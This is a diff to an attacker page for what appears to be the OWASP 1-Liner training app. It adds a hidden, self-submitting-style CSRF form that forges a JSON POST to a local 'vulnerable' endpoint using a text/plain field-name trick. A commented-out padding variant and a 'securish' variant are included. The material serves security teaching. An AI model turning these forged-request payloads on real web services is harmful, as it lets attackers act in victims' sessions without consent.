@@ -10,10 +10,30 @@
     </script>
 </head>
 <body>
+
 <img src="../dancing_pig.gif" alt="http://graphicshunt.com/images/pig-8647.htm"/>
+
+<!-- CSRF POST to /vulnerable using JSON commenting, works with Jackson that's used in OWASP 1-Liner -->
+<form id="target" enctype="text/plain" method="POST" action="https://local.1-liner.org:8444/ws/vulnerable/oneliners" style="visibility:hidden">
+    <input type="text" name='{"id": 0, "nickName": "John", "oneLiner": "I hate OWASP!", "timestamp": "20111006"}//' value="dummy" />
+    <input type="submit" value="Go" />
+</form>
+
+<!-- CSRF POST to /vulnerable using JSON padding, does not work with Jackson that's used in OWASP 1-Liner -->
+<!--
+<form id="target" enctype="text/plain" method="POST" action="https://local.1-liner.org:8444/ws/vulnerable/oneliners" style="visibility:hidden">
+    <input type="text" name='{"id": 0, "nickName": "John", "oneLiner": "I hate OWASP!", "timestamp": "20111006", "paddingDummy": "' value='"}' />
+    <input type="submit" value="Go" />
+</form>
+-->
+
+<!-- CSRF POST to /securish -->
+<!--
 <form id="target" enctype="text/plain" method="POST" action="https://local.1-liner.org:8444/ws/securish/oneliners" style="visibility:hidden">
     <input type="text" name='{"id": 0, "nickName": "John", "oneLiner": "I hate OWASP!", "timestamp": "20111006"}//' value="dummy" />
     <input type="submit" value="Go" />
 </form>
+-->
+
 </body>
 </html>
